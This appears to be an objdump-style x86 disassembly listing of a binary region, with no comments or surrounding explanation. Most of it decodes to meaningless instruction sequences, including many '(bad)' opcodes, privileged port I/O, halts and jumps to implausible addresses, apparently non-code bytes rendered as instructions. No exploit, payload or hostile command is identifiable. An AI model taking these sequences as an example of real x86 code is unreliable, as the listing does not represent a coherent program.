  433ece:	mov    edi,edi
  433ed0:	hlt    
  433ed1:	inc    esi
  433ed3:	inc    ebp
  433ed4:	ret    0x4533
  433ed7:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433edd:	or     BYTE PTR [ebx],dh
  433edf:	dec    ebp
  433ee0:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433ee6:	jne    0xff8d3ead
  433eec:	inc    ebp
  433eed:	inc    ebp
  433eee:	mov    esi,DWORD PTR [ebx]
  433ef0:	clc    
  433ef1:	pop    esi
  433ef2:	ret    0xcaeb
  433ef5:	mov    eax,esi
  433ef7:	call   0x520490ca
  433efc:	dec    ebp
  433efd:	add    eax,0xf8728b
  433f02:	adc    eax,0xce0ccac9
  433f07:	push   ebp
  433f08:	ret    0xc6ec
  433f0b:	in     al,dx
  433f0c:	call   0x33438c15
  433f11:	push   edi
  433f12:	add    edi,eax
  433f14:	xor    eax,eax
  433f16:	jmp    0x433f5d
  433f18:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433f1e:	add    eax,edi
  433f20:	shr    eax,cl
  433f22:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433f28:	mov    edi,DWORD PTR [ecx]
  433f2a:	in     al,dx
  433f2b:	pushf  
  433f2c:	ret    0x84c7
  433f2f:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433f35:	inc    ebp
  433f36:	in     al,dx
  433f37:	ss inc ebp
  433f39:	pushf  
  433f3a:	mov    eax,edi
  433f3c:	cld    
  433f3d:	fmul   st(2),st
  433f3f:	sbb    dl,al
  433f41:	jmp    0x9c3b:0x374d45c1
  433f48:	jbe    0x433f11
  433f4a:	mov    esp,eax
  433f4c:	clc    
  433f4d:	add    BYTE PTR [ebp+0x0],cl
  433f50:	mov    ecx,ecx
  433f52:	lea    eax,[ebp-0x5]
  433f55:	mov    edi,edi
  433f57:	call   0x51ce90a1
  433f5c:	hlt    
  433f5d:	xor    eax,edx
  433f5f:	mov    esi,0x997284
  433f64:	xor    cl,dl
  433f66:	mov    esi,eax
  433f68:	hlt    
  433f69:	into   
  433f6a:	inc    ebp
  433f6b:	scas   eax,DWORD PTR es:[edi]
  433f6c:	mov    ebp,ecx
  433f6e:	cld    
  433f6f:	add    dl,cl
  433f71:	add    dl,al
  433f73:	inc    ebp
  433f74:	shr    DWORD PTR [ebx],0x4d
  433f77:	xor    edi,DWORD PTR [ebx]
  433f79:	mov    DWORD PTR [edi],ecx
  433f7b:	clc    
  433f7c:	dec    esi
  433f7d:	inc    ebp
  433f7e:	dec    DWORD PTR [ebx-0x3d2b1775]
  433f84:	ret    0xc6ca
  433f87:	mov    BYTE PTR [ebp-0x32],0x53
  433f8b:	scas   eax,DWORD PTR es:[edi]
  433f8c:	inc    ebp
  433f8d:	jmp    0x433fc6
  433f8f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433f96:	pop    ebx
  433f97:	xor    ecx,DWORD PTR [ebp+0x3]
  433f9a:	mov    eax,DWORD PTR [ebx]
  433f9c:	clc    
  433f9d:	test   edx,ecx
  433f9f:	mov    ecx,esi
  433fa1:	cld    
  433fa2:	call   0x8ab784ec
  433fa7:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433fad:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433fb3:	fdiv   QWORD PTR [ebx]
  433fb5:	retf   0xce89
  433fb8:	in     al,0xc1
  433fba:	inc    ebp
  433fbb:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433fc1:	into   
  433fc2:	mov    dh,0xc1
  433fc5:	call   0x8c17854e
  433fca:	(bad)  
  433fcb:	cld    
  433fcc:	mov    ecx,DWORD PTR [ebp-0x14]
  433fcf:	xor    eax,ecx
  433fd1:	lea    eax,[ebp+0x8]
  433fd4:	mov    esi,DWORD PTR [edx-0x4]
  433fd7:	add    dl,al
  433fd9:	inc    ebp
  433fda:	mov    esp,0x32d8998b
  433fdf:	dec    ebp
  433fe0:	mov    esi,DWORD PTR [ebx]
  433fe2:	cld    
  433fe3:	xor    eax,edx
  433fe5:	sub    esp,DWORD PTR [edi-0x75]
  433fe8:	int    0xec
  433fea:	sub    ecx,eax
  433fec:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  433ff2:	mov    esi,esp
  433ff4:	call   0x34178d7d
  433ff9:	inc    DWORD PTR [ebx]
  433ffb:	mov    edi,DWORD PTR [ebx]
  433ffd:	cld    
  433ffe:	jne    0x43404d
  434000:	mov    esi,DWORD PTR [ebx]
  434002:	aam    0x8d
  434004:	dec    ebp
  434005:	or     BYTE PTR [ebx],dh
  434007:	jb     0x43400c
  434009:	add    BYTE PTR [edi+0x45],bl
  43400c:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  434013:	xor    ebp,esp
  434015:	xor    eax,edi
  434017:	sub    edi,esp
  434019:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  43401f:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  434026:	inc    ebp
  434027:	xor    ecx,DWORD PTR [ecx+0x45891403]
  43402d:	clc    
  43402e:	mov    eax,edi
  434030:	nop
  434031:	fadd   QWORD PTR [eax]
  434033:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  434039:	jmp    0x433fc4
  43403b:	mov    eax,DWORD PTR [ecx]
  43403d:	fadd   DWORD PTR [eax]
  43403f:	inc    ebp
  434040:	or     DWORD PTR [ebx],esi
  434042:	dec    eax
  434043:	add    edx,DWORD PTR [ebx-0x2d]
  434046:	dec    ebp
  434047:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  43404d:	inc    ebp
  43404e:	push   ecx
  43404f:	mov    dl,BYTE PTR [ecx-0xd]
  434052:	xor    ecx,DWORD PTR [ebp-0x45]
  434055:	(bad)  
  434057:	rol    BYTE PTR [eax],0xc1
  43405a:	ret    
  43405b:	inc    ebp
  43405c:	inc    ebp
  43405d:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  434063:	xor    eax,ebx
  434065:	add    eax,DWORD PTR [ebp+0x23]
  434068:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43406e:	cmp    edi,0xc
  434071:	dec    ebp
  434072:	inc    ebp
  434073:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  434079:	inc    ebp
  43407a:	mov    esi,DWORD PTR [ebx]
  43407c:	clc    
  43407d:	lea    eax,[ebp+0x45725407]
  434083:	add    BYTE PTR [ebp+eax*2-0x75],dh
  434087:	xor    edi,DWORD PTR [eax]
  434089:	mov    ecx,0xff8b8d4d
  43408e:	push   esp
  43408f:	enter  0x4df7,0x23
  434093:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  434099:	mov    eax,DWORD PTR [ebx]
  43409b:	loopne 0x434088
  43409d:	ret    0xc68b
  4340a0:	push   esp
  4340a1:	enter  0x9745,0x8b
  4340a5:	inc    ebp
  4340a6:	cld    
  4340a7:	mov    eax,edi
  4340a9:	clc    
  4340aa:	ret    
  4340ab:	ret    0xc645
  4340ae:	mov    esi,DWORD PTR [ebx]
  4340b0:	cld    
  4340b1:	pop    esi
  4340b2:	mov    ebx,0x83458bc3
  4340b8:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4340bc:	dec    ebp
  4340bd:	xor    ebx,DWORD PTR ss:[ebx+eax*1-0x767a7646]
  4340c5:	clc    
  4340c6:	fcom   DWORD PTR [ebp+0x45]
  4340c9:	mov    edi,DWORD PTR [eax]
  4340cb:	adc    al,0x9c
  4340cd:	inc    ebp
  4340ce:	(bad)  
  4340cf:	mov    ebx,eax
  4340d1:	adc    al,0x85
  4340d3:	cmp    al,0x1
  4340d6:	inc    ebp
  4340d7:	add    BYTE PTR [edx],bh
  4340d9:	dec    ebp
  4340da:	pushf  
  4340db:	mov    ebp,ecx
  4340dd:	mov    eax,DWORD PTR [ebx]
  4340df:	nop
  4340e0:	add    BYTE PTR [eax],al
  4340e2:	inc    ebp
  4340e3:	mov    esi,DWORD PTR [ebx]
  4340e5:	add    eax,DWORD PTR [ebx]
  4340e7:	cmp    al,0x89
  4340e9:	mov    esp,esi
  4340eb:	clc    
  4340ec:	inc    ebp
  4340ed:	inc    ebp
  4340ee:	add    edx,DWORD PTR [esi+0xc]
  4340f1:	mov    edi,0x7ff0845
  4340f6:	in     al,dx
  4340f7:	(bad)  
  4340f8:	jne    0x434093
  4340fa:	mov    esi,DWORD PTR [edx]
  4340fc:	clc    
  4340fd:	add    ebp,DWORD PTR [esi]
  4340ff:	mov    edi,edi
  434101:	in     al,dx
  434102:	mov    DWORD PTR [ebp-0x10],eax
  434105:	xor    eax,DWORD PTR [ebp+0x3]
  434108:	mov    DWORD PTR ds:[esp+esi*8-0x7427ba75],ebx
  434110:	(bad)  
  434111:	push   eax
  434112:	ret    
  434113:	call   0xd4ffcaa5
  434118:	call   0xffcf3962
  43411d:	cmp    BYTE PTR [ebp+0x4d],al
  434120:	test   DWORD PTR [eax+0x74],ecx
  434123:	inc    ecx
  434124:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  43412a:	ret    
  43412b:	inc    eax
  43412c:	dec    DWORD PTR [ebx+0x4945f8f0]
  434132:	push   eax
  434133:	dec    eax
  434134:	test   al,0xd0
  434136:	dec    eax
  434138:	mov    eax,DWORD PTR [ebp-0x14]
  43413b:	mov    eax,DWORD PTR [ebp+0x38]
  43413e:	mov    eax,ecx
  434140:	fadd   DWORD PTR [ebx]
  434142:	dec    ebp
  434143:	inc    eax
  434144:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  43414a:	inc    ebp
  43414b:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  434151:	fadd   QWORD PTR [ebx]
  434153:	inc    ebp
  434154:	or     al,0x33
  434156:	dec    ebp
  434157:	add    edi,DWORD PTR [ebx]
  434159:	mov    DWORD PTR [edx-0x28],esi
  43415c:	mov    eax,DWORD PTR [ebp-0x10]
  43415f:	mov    eax,DWORD PTR [eax+0x10]
  434162:	mov    eax,edi
  434164:	lock ret 
  434166:	inc    ecx
  434167:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  43416d:	fsubr  st,st(5)
  43416f:	test   DWORD PTR [eax],eax
  434171:	clc    
  434172:	push   0x45
  434174:	(bad)  
  434175:	cmp    ebp,esp
  434177:	pushf  
  434178:	inc    ebp
  434179:	(bad)  
  43417a:	push   eax
  43417b:	fsub   DWORD PTR [eax-0x7b]
  43417e:	(bad)  
  43417f:	clc    
  434180:	mov    eax,0xf8008584
  434185:	mov    eax,DWORD PTR [ebp-0x4]
  434188:	mov    edi,0x4585c3cc
  43418e:	clc    
  43418f:	mov    eax,DWORD PTR [ebp+0x14]
  434192:	cmp    BYTE PTR [ebp-0x64],al
  434195:	mov    edi,eax
  434197:	in     al,dx
  434198:	les    esi,FWORD PTR [ebp-0x7b]
  43419b:	mov    edi,eax
  43419d:	or     al,0x4d
  43419f:	dec    ebp
  4341a0:	mov    eax,ebp
  4341a2:	in     al,0xf2
  4341a4:	dec    ebp
  4341a5:	dec    DWORD PTR [ecx+0x4dc7e045]
  4341ab:	fmul   DWORD PTR [ecx+0x4df8f085]
  4341b1:	inc    ebp
  4341b2:	mov    DWORD PTR [ebx],esi
  4341b4:	fadd   QWORD PTR [ebx]
  4341b6:	dec    ebp
  4341b7:	push   eax
  4341b8:	xor    eax,DWORD PTR [ebp+0x3]
  4341bb:	push   eax
  4341bc:	mov    DWORD PTR [eax+ebx*8],ebx
  4341bf:	push   esi
  4341c1:	mov    eax,DWORD PTR [eax]
  4341c3:	lock cmp eax,0xf84e85c0
  4341c9:	inc    ebp
  4341ca:	test   BYTE PTR [ebx],dh
  4341cc:	add    DWORD PTR [ebx],eax
  4341ce:	add    BYTE PTR [eax+0x4d],dl
  4341d1:	jne    0x434206
  4341d3:	lea    ecx,[ebx-0x7617fc44]
  4341d9:	div    ah
  4341db:	inc    DWORD PTR [ebp+0x45]
  4341de:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  4341e4:	jb     0x434171
  4341e6:	add    BYTE PTR [eax*2-0x17ba743f],cl
  4341ed:	mov    ecx,DWORD PTR [ebp-0x10]
  4341f0:	xor    ecx,DWORD PTR [ebp+0x3]
  4341f3:	mov    edi,DWORD PTR [ebx]
  4341f5:	adc    BYTE PTR [ebp+0x41],dh
  4341f8:	mov    ecx,DWORD PTR [ebx-0x37382704]
  4341fe:	ret    
  4341ff:	push   ss
  434200:	push   0x45
  434202:	lea    ecx,[ebx+0x4de80cb0]
  434208:	sti    
  434209:	add    edi,edi
  43420b:	or     BYTE PTR [ebp+0x4d],al
  43420e:	mov    ebp,DWORD PTR [ebx]
  434210:	xor    ebp,ecx
  434212:	mov    al,BYTE PTR [edx]
  434214:	add    eax,0xc7200
  434219:	jne    0x434268
  43421b:	lea    esi,[ebx]
  43421d:	mov    al,0xf
  43421f:	call   0xf38e4
  434224:	shl    DWORD PTR [esi],0x84
  434227:	pushf  
  434228:	add    DWORD PTR [ecx+0x4545d000],ecx
  43422e:	mov    edi,DWORD PTR [ecx]
  434230:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  434237:	test   DWORD PTR [eax],eax
  434239:	clc    
  43423a:	dec    ebp
  43423b:	inc    ebp
  43423c:	xor    edi,DWORD PTR [ebx]
  43423e:	setl   al
  434241:	(bad)  
  434242:	retf   
  434243:	rol    cl,1
  434245:	dec    ebp
  434246:	test   BYTE PTR [ebp+0x4d00cc01],cl
  43424c:	inc    ebp
  43424d:	lea    ecx,[ebx-0x75b2cc38]
  434253:	lea    eax,ds:0x4d72c4
  434259:	mov    ecx,DWORD PTR [ebp-0x4]
  43425c:	xor    ecx,edi
  43425e:	bswap  ebx
  434260:	ror    BYTE PTR [ebp-0x35],0xe9
  434264:	rol    DWORD PTR [ecx],0x84
  434267:	add    BYTE PTR [ecx],al
  434269:	cmp    BYTE PTR [eax],al
  43426b:	pushf  
  43426c:	inc    ebp
  43426d:	jnp    0x8a437670
  434273:	mov    eax,DWORD PTR ds:0xcf72e8
  434279:	lock dec ebp
  43427b:	retf   
  43427c:	xor    ecx,DWORD PTR [ebp+0xf]
  43427f:	mov    eax,eax
  434281:	fmul   st,st(3)
  434283:	test   ecx,0x1998484
  434289:	xor    al,BYTE PTR [eax]
  43428b:	mov    DWORD PTR [ebp-0x28],eax
  43428e:	mov    eax,DWORD PTR [ebp+0x33]
  434291:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  434297:	ret    
  434298:	add    al,cl
  43429a:	dec    ebp
  43429b:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4342a1:	add    ecx,DWORD PTR ds:0xc7250
  4342a7:	inc    ebp
  4342a8:	rcl    DWORD PTR [eax+0x4d],0x2b
  4342ac:	mov    edi,edi
  4342ae:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4342b4:	jb     0x43427d
  4342b6:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4342bd:	mov    esi,DWORD PTR [ebx]
  4342bf:	cld    
  4342c0:	mov    cl,bh
  4342c2:	or     eax,0x372b6
  4342c7:	cmp    ecx,eax
  4342c9:	jne    0x434346
  4342cf:	mov    eax,DWORD PTR [ebp-0x20]
  4342d2:	mov    eax,DWORD PTR [eax]
  4342d4:	xor    eax,edi
  4342d6:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4342dd:	mov    ecx,DWORD PTR [ebp-0x4]
  4342e0:	mov    ecx,edi
  4342e2:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4342e8:	jb     0x4342f9
  4342ea:	add    BYTE PTR [edi-0x3f],dl
  4342ed:	add    BYTE PTR [ebp-0x75],cl
  4342f0:	mov    esi,eax
  4342f2:	xor    eax,DWORD PTR [eax]
  4342f4:	mov    al,bh
  4342f6:	or     eax,0x497284
  4342fb:	xor    al,cl
  4342fd:	mov    ecx,DWORD PTR [ebp-0x4]
  434300:	mov    ecx,edi
  434302:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  434308:	jb     0x434319
  43430a:	add    BYTE PTR [edi],dh
  43430c:	enter  0x8500,0x8b
  434310:	add    ah,bl
  434312:	add    BYTE PTR [eax],al
  434314:	inc    ebp
  434315:	(bad)  
  434316:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  43431d:	mov    esi,DWORD PTR [edx-0x4]
  434320:	add    bh,cl
  434322:	dec    ebp
  434323:	mov    dh,0x8b
  434325:	add    esi,DWORD PTR [ebx]
  434327:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  43432d:	add    BYTE PTR [eax],al
  43432f:	mov    eax,ecx
  434331:	loopne 0x434380
  434333:	add    BYTE PTR [ebx-0x757bcc39],cl
  434339:	dec    ecx
  43433a:	or     eax,0x8b7232
  43433f:	in     al,0xc1
  434341:	or     DWORD PTR [ebp-0x31],ecx
  434344:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  43434b:	xor    dh,BYTE PTR [edx-0x75]
  43434e:	add    al,dh
  434350:	enter  0x4f09,0xcf
  434354:	inc    ebp
  434355:	mov    WORD PTR [ebx-0x75cdccb7],cs
  43435b:	or     al,BYTE PTR ds:0xe4728b
  434361:	or     DWORD PTR [ebp-0x31],ecx
  434364:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  43436b:	cmp    dh,BYTE PTR [edx+0xf]
  43436e:	add    bl,dl
  434370:	rol    DWORD PTR [eax],0x4d
  434373:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  434379:	(bad)  
  43437a:	or     eax,0x497284
  43437f:	xor    al,cl
  434381:	mov    ecx,DWORD PTR [ebp-0x20]
  434384:	mov    ecx,DWORD PTR [ecx]
  434386:	xor    ecx,edi
  434388:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  43438f:	xor    cl,al
  434391:	mov    ecx,DWORD PTR [edi]
  434393:	fadd   QWORD PTR [ebp+0x9]
  434396:	call   0xffd03e6a
  43439b:	dec    ecx
  43439c:	dec    ebp
  43439d:	xor    bh,BYTE PTR [ebx]
  43439f:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4343a3:	loopne 0x4343a1
  4343a5:	or     edi,eax
  4343a7:	iret   
  4343a8:	ret    
  4343a9:	mov    WORD PTR [ebp+0x4d],es
  4343ac:	mov    esi,DWORD PTR [edx]
  4343ae:	call   0x84530aed
  4343b3:	(bad)  
  4343b4:	cdq    
  4343b5:	add    BYTE PTR [edx],dh
  4343b7:	mov    esi,DWORD PTR [ebx]
  4343b9:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4343bf:	test   BYTE PTR [ebx],dh
  4343c1:	dec    ecx
  4343c2:	add    esi,DWORD PTR [edx]
  4343c4:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4343ca:	dec    edi
  4343cc:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d49]
  4343d3:	xor    al,BYTE PTR [ebx]
  4343d5:	mov    edi,DWORD PTR [ebx]
  4343d7:	in     al,0x75
  4343d9:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4343df:	dec    ecx
  4343e0:	xor    esi,DWORD PTR [edx]
  4343e2:	lea    ecx,[edx]
  4343e4:	or     BYTE PTR [ebx+0x900f072],cl
  4343ea:	ja     0x4343bb
  4343ec:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b3],cl
  4343f3:	cmp    ch,al
  4343f5:	jne    0x4343ea
  4343f7:	mov    edi,edi
  4343f9:	fadd   QWORD PTR [ebp+0x0]
  4343fc:	mov    eax,edi
  4343fe:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb7]
  434405:	mov    edx,DWORD PTR [ebx]
  434407:	in     al,0x45
  434409:	or     DWORD PTR [ebx],esi
  43440b:	iret   
  43440c:	add    ecx,DWORD PTR [eax+edx*2+0x45321849]
  434413:	xor    dl,BYTE PTR [eax-0x75]
  434416:	sbb    al,0xe0
  434418:	dec    DWORD PTR [ecx]
  43441a:	mov    ecx,edi
  43441c:	in     al,dx
  43441d:	mov    eax,es
  43441f:	dec    ecx
  434420:	mov    DWORD PTR [edx],esi
  434422:	fmul   QWORD PTR [edx]
  434424:	jne    0x4343b1
  434426:	(bad)  
  434427:	(bad)  
  434429:	or     DWORD PTR [ebp-0x31],eax
  43442c:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b3]
  434433:	cmp    bh,bh
  434435:	jne    0x43447c
  434437:	lea    ecx,[ebx-0x38372750]
  43443d:	inc    ebx
  43443f:	mov    eax,ecx
  434441:	mov    eax,0xa00c111
  434446:	jne    0x43448d
  434448:	mov    esi,DWORD PTR [ebx]
  43444a:	test   al,0x3
  43444c:	inc    ebp
  43444d:	mov    DWORD PTR [eax-0xc],edx
  434450:	loop   0x434497
  434452:	push   DWORD PTR [ebx]
  434454:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43445a:	add    DWORD PTR [eax],eax
  43445c:	mov    eax,edi
  43445e:	lods   al,BYTE PTR ds:[esi]
  43445f:	dec    ebp
  434460:	inc    ebp
  434461:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  434467:	retf   
  434468:	mov    edx,ecx
  43446a:	adc    al,0x84
  43446c:	(bad)  
  43446d:	std    
  43446e:	ret    
  43446f:	jmp    FWORD PTR [edi-0x2b7474bb]
  434475:	hlt    
  434476:	rol    edi,0x82
  434479:	ret    
  43447a:	cld    
  43447b:	enter  0x11ff,0x45
  43447f:	inc    ebp
  434480:	pop    edi
  434481:	mov    ebx,DWORD PTR [ebx+0x14]
  434484:	ret    0xc7
  434487:	test   BYTE PTR [ebx+0x45325199],cl
  43448d:	jmp    0x43441a
  43448f:	push   0x8
  434491:	call   DWORD PTR [esi]
  434493:	in     al,dx
  434494:	add    BYTE PTR [ebp+0x1],0x50
  434498:	add    bh,ah
  43449a:	add    bh,bh
  43449c:	icebp  
  43449d:	mov    ecx,DWORD PTR [eax]
  43449f:	cld    
  4344a0:	pop    es
  4344a1:	dec    ebp
  4344a2:	shl    DWORD PTR [ebx],0x72
  4344a5:	add    eax,DWORD PTR [eax]
  4344a7:	cmp    edx,ecx
  4344a9:	je     0x4344bb
  4344ab:	mov    esi,DWORD PTR [ebp-0x4]
  4344ae:	inc    edi
  4344b0:	or     al,0xc3
  4344b2:	jmp    FWORD PTR [edx-0x18]
  4344b5:	(bad)  
  4344b6:	sti    
  4344b7:	cwde   
  4344b8:	(bad)  
  4344b9:	call   0xffa13dc4
  4344be:	or     al,0x45
  4344c0:	push   ebp
  4344c1:	sub    esp,0x18
  4344c4:	push   ebx
  4344c5:	inc    ebp
  4344c6:	mov    edi,edi
  4344c8:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4344cf:	test   al,0x51
  4344d1:	inc    ebp
  4344d2:	push   ecx
  4344d3:	push   eax
  4344d4:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4344da:	add    ah,bh
  4344dc:	(bad)  
  4344dd:	dec    ebp
  4344de:	add    DWORD PTR [ebx],esi
  4344e0:	inc    ebp
  4344e1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4344e7:	push   0xffffff8b
  4344e9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4344ef:	add    eax,DWORD PTR [ecx]
  4344f1:	or     BYTE PTR [eax],al
  4344f3:	call   0xff853cf8
  4344f8:	mov    eax,DWORD PTR [ebp+0x14]
  4344fb:	mov    ecx,DWORD PTR [ecx+0x801ac]
  434501:	inc    ebp
  434502:	dec    ecx
  434503:	add    ebp,DWORD PTR [edx+0x14]
  434506:	push   0x8b3045
  43450b:	call   0x33ad9280
  434510:	inc    DWORD PTR [ebx]
  434512:	mov    DWORD PTR [edi],ecx
  434514:	mov    eax,ecx
  434516:	or     BYTE PTR [ebp-0x3d],cl
  434519:	cmp    eax,edi
  43451b:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  434520:	adc    BYTE PTR [ebx+0x5eff0845],cl
  434526:	adc    al,0xc9
  434528:	inc    ebp
  434529:	adc    BYTE PTR [eax+0x55],dl
  43452c:	jne    0x43451a
  43452e:	call   0xff5444be
  434533:	dec    ebp
  434534:	inc    ebp
  434535:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43453b:	add    BYTE PTR [ebx],bh
  43453d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  434541:	push   ecx
  434542:	or     al,0x51
  434544:	dec    ebp
  434545:	xor    DWORD PTR [ebx],0xf320399
  43454b:	cmp    eax,DWORD PTR [ebp+0x74]
  43454e:	mov    edi,edi
  434550:	pop    edi
  434551:	adc    BYTE PTR [ebx+0x75],bl
  434554:	ret    0x50
  434557:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43455b:	(bad)  
  43455c:	clc    
  43455d:	mov    esp,ebp
  43455f:	pop    ecx
  434560:	mov    ecx,0xf80085c2
  434565:	mov    ecx,DWORD PTR [ecx+edx*2]
  434568:	push   esi
  434569:	push   esi
  43456a:	(bad)  
  43456b:	lock add eax,DWORD PTR [ebp+0x44]
  43456f:	mov    edx,DWORD PTR [eax]
  434571:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  434575:	or     BYTE PTR [ecx+0x7],dl
  434578:	push   ecx
  434579:	ret    
  43457a:	xor    ebx,DWORD PTR [ecx+0x37232be]
  434580:	add    BYTE PTR [ecx+0x147c8bfe],cl
  434586:	or     al,0x80
  434588:	jge    0x43458b
  43458a:	mov    DWORD PTR [eax],eax
  43458c:	and    al,0x8
  43458e:	cmp    DWORD PTR [ebp+0x10],eax
  434591:	mov    edx,DWORD PTR [esi]
  434593:	xchg   esp,eax
  434594:	dec    esp
  434595:	add    BYTE PTR [eax],dl
  434597:	mov    ecx,edx
  434599:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43459d:	dec    ebp
  43459e:	into   
  43459f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4345a5:	mov    edx,DWORD PTR [eax+0x14]
  4345a8:	das    
  4345a9:	add    al,0x45
  4345ab:	add    BYTE PTR [ebp+0x0],dh
  4345ae:	mov    edi,edi
  4345b0:	and    al,0x50
  4345b2:	mov    eax,DWORD PTR [eax]
  4345b4:	and    al,0xd1
  4345b6:	xor    eax,DWORD PTR [esi]
  4345b8:	lea    eax,[ebp+0x8]
  4345bb:	xor    esi,DWORD PTR [edx+0x3]
  4345be:	add    BYTE PTR [ecx+0x4510fc44],cl
  4345c4:	cmp    BYTE PTR [ebx+0x75eb0c9c],cl
  4345ca:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4345d4:	cmp    edi,edi
  4345d6:	pushf  
  4345d7:	mov    edi,edi
  4345d9:	or     BYTE PTR [esi+ecx*1],cl
  4345dc:	jne    0x4345a1
  4345de:	call   0xc45aa
  4345e3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4345e7:	mov    ebx,DWORD PTR [eax]
  4345e9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4345ed:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4345f5:	pop    esi
  4345f6:	(bad)  
  4345f7:	leave  
  4345f8:	call   DWORD PTR [eax]
  4345fa:	call   DWORD PTR [ebp+0x24]
  4345fd:	in     al,dx
  4345fe:	jmp    esp
  434600:	and    al,0x83
  434602:	call   0xff7a4417
  434607:	pushf  
  434608:	inc    esp
  434609:	mov    DWORD PTR [esp],ecx
  43460c:	pop    esi
  43460d:	push   edi
  43460e:	in     eax,0x41
  434610:	ret    0x89
  434613:	and    al,0xe
  434615:	mov    edi,DWORD PTR [eax]
  434617:	and    al,0x75
  434619:	mov    edx,0x7750885
  43461e:	or     dl,bh
  434620:	call   FWORD PTR [ecx+0x3243224]
  434626:	or     BYTE PTR [ecx-0x74ebdbe8],cl
  43462c:	dec    DWORD PTR [esp]
  43462f:	jl     0x4345bc
  434631:	adc    al,0xc
  434633:	dec    ebp
  434634:	cmp    DWORD PTR [ebp+0x1c],esi
  434637:	mov    ecx,DWORD PTR [eax]
  434639:	and    al,0x10
  43463b:	xor    eax,DWORD PTR [ebx+ecx*4+0x3242432]
  434642:	test   DWORD PTR [edi],ecx
  434644:	jge    0x434610
  434646:	push   0x8908ff4c
  43464b:	jmp    0x434671
  43464d:	adc    BYTE PTR [esp+eax*2-0x75],dh
  434651:	dec    esp
  434652:	pop    ebp
  434653:	ret    0x8999
  434656:	push   0x74f89cf8
  43465b:	jmp    0x4346d1
  43465d:	mov    edi,0x104fd55f
  434662:	add    BYTE PTR [eax],dh
  434664:	adc    BYTE PTR ds:[eax],al
  434667:	or     edx,DWORD PTR gs:[eax]
  43466a:	add    BYTE PTR [ecx],ch
  43466c:	add    eax,0x35270010
  434671:	adc    BYTE PTR [eax],al
  434673:	std    
  434674:	dec    eax
  434675:	adc    BYTE PTR [eax],al
  434677:	(bad)  
  434678:	outs   dx,BYTE PTR ds:[esi]
  434679:	adc    BYTE PTR [eax],al
  43467b:	sahf   
  43467c:	xor    DWORD PTR [eax],edx
  43467e:	add    BYTE PTR [esi+0x0],al
  434681:	adc    BYTE PTR [eax],al
  434683:	fs jae 0x434696
  434686:	add    BYTE PTR [ebx+0x5f001054],bh
  43468c:	inc    esi
  43468d:	inc    ebx
  43468e:	add    BYTE PTR [ebx+0x46],ah
  434691:	inc    ebx
  434692:	add    BYTE PTR [edi+0x46],ah
  434695:	inc    ebx
  434696:	add    BYTE PTR [ebx+0x46],ch
  434699:	inc    ebx
  43469a:	add    BYTE PTR [edi+0x46],ch
  43469d:	inc    ebx
  43469e:	add    BYTE PTR [ebx+0x46],dh
  4346a1:	inc    ebx
  4346a2:	add    BYTE PTR [edi+0x46],dh
  4346a5:	inc    ebx
  4346a6:	add    BYTE PTR [ebx+0x46],bh
  4346a9:	inc    ebx
